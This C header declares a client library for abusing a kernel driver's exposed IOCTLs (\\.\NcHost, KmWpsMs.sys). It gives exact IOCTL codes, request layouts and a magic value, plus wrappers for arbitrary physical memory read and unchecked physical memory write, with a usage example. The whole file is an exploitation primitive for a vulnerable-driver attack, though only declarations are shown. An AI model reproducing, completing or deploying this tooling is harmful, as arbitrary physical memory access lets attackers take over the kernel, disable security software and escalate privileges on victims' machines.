/*
 * nchost.h — Client library for the NcHost kernel driver (KmWpsMs.sys)
 *
 * Provides typed wrappers around the vulnerable IOCTLs exposed by
 * \\.\NcHost:
 *
 *   0x2221A4  Read arbitrary physical memory
 *   0x2221DC  Multi-subcommand physical memory operations:
 *             subcmd 1 = translate VA -> PA
 *             subcmd 2 = write physical memory
 *             subcmd 3 = allocate + lock MDL (kernel)
 *             subcmd 5 = allocate + lock MDL (user)
 *             subcmd 6/7 = map locked pages
 *             subcmd 8 = free MDL
 *
 * Usage:
 *   NCHOST ctx;
 *   if (nchost_open(&ctx)) {
 *       UCHAR buf[0x100];
 *       PHYSICAL_ADDRESS pa;
 *       pa.QuadPart = 0x1000;
 *       nchost_read_physical(&ctx, pa, buf, sizeof(buf));
 *       ...
 *       nchost_close(&ctx);
 *   }
 */

#ifndef NCHOST_H
#define NCHOST_H

#include <windows.h>
#include <stdint.h>

#ifdef __cplusplus
extern "C" {
#endif

/* ------------------------------------------------------------------ */
/*  IOCTL codes — METHOD_NEITHER, FILE_DEVICE_UNKNOWN (0x22)          */
/* ------------------------------------------------------------------ */

#define IOCTL_NCHOST_READ_PHYSICAL   0x2221A4
#define IOCTL_NCHOST_PHYSICAL_OP     0x2221DC
#define IOCTL_NCHOST_GET_VERSION     0x222004

/* ------------------------------------------------------------------ */
/*  Physical-operation subcommands                                    */
/* ------------------------------------------------------------------ */

#define NCHOST_PHYSOP_GET_PA         1
#define NCHOST_PHYSOP_WRITE_PHYS     2
#define NCHOST_PHYSOP_ALLOC_MDL_K    3
#define NCHOST_PHYSOP_COPY_MDL       4
#define NCHOST_PHYSOP_ALLOC_MDL_U    5
#define NCHOST_PHYSOP_MAP_KERNEL     6
#define NCHOST_PHYSOP_MAP_USER       7
#define NCHOST_PHYSOP_FREE_MDL       8

/* ------------------------------------------------------------------ */
/*  IOCTL request structures (must match driver layout exactly)       */
/* ------------------------------------------------------------------ */

#pragma pack(push, 8)

typedef struct NCHOST_PHYSMEM_REQUEST {
    UINT64      phys_addr;      /* physical address to read           */
    UINT64      reserved1;      /* unused                             */
    UINT64      reserved2;      /* unused                             */
} NCHOST_PHYSMEM_REQUEST;

typedef struct NCHOST_PHYSOP_REQUEST {
    UINT16      magic;          /* must be 0x4641 ('AF')              */
    UINT16      subcommand;     /* 1-8                                */
    UINT32      map_size;       /* size for MmMapIoSpace              */
    UINT64      copy_size;      /* byte count for copies              */
    UINT64      virt_addr;      /* virtual address operand            */
    UINT64      mdl_or_dst;     /* MDL pointer or destination address  */
    UINT64      phys_addr;      /* physical address operand           */
} NCHOST_PHYSOP_REQUEST;

#pragma pack(pop)

/* ------------------------------------------------------------------ */
/*  Client context                                                    */
/* ------------------------------------------------------------------ */

typedef struct NCHOST {
    HANDLE      device;
    DWORD       last_error;
} NCHOST;

/* ------------------------------------------------------------------ */
/*  API                                                               */
/* ------------------------------------------------------------------ */

/*
 * Open a handle to \\.\NcHost.
 * Returns TRUE on success; on failure sets ctx->last_error.
 */
BOOL nchost_open(NCHOST *ctx);

/*
 * Close the device handle.
 */
void nchost_close(NCHOST *ctx);

/*
 * IOCTL 0x222004 — Retrieve the driver version as a DWORD.
 */
BOOL nchost_get_version(NCHOST *ctx, UINT32 *version_out);

/*
 * IOCTL 0x2221A4 — Read `size` bytes starting at physical address
 * `phys_addr` into `buffer`.  No validation on the physical address.
 *
 * This wrapper loops across page boundaries — the driver caps each
 * call at one page (0x1000 minus the intra-page offset).
 */
BOOL nchost_read_physical(NCHOST *ctx, UINT64 phys_addr,
                          void *buffer, SIZE_T size);

/*
 * IOCTL 0x2221DC subcmd 1 — Translate a kernel virtual address to
 * its backing physical address via MmGetPhysicalAddress.
 */
BOOL nchost_get_physical_addr(NCHOST *ctx, UINT64 virt_addr,
                              UINT64 *phys_out);

/*
 * IOCTL 0x2221DC subcmd 2 — Write `size` bytes from `buffer` to
 * the specified physical address.  No access checks.
 */
BOOL nchost_write_physical(NCHOST *ctx, UINT64 phys_addr,
                           const void *buffer, SIZE_T size);

#ifdef __cplusplus
}
#endif

#endif /* NCHOST_H */
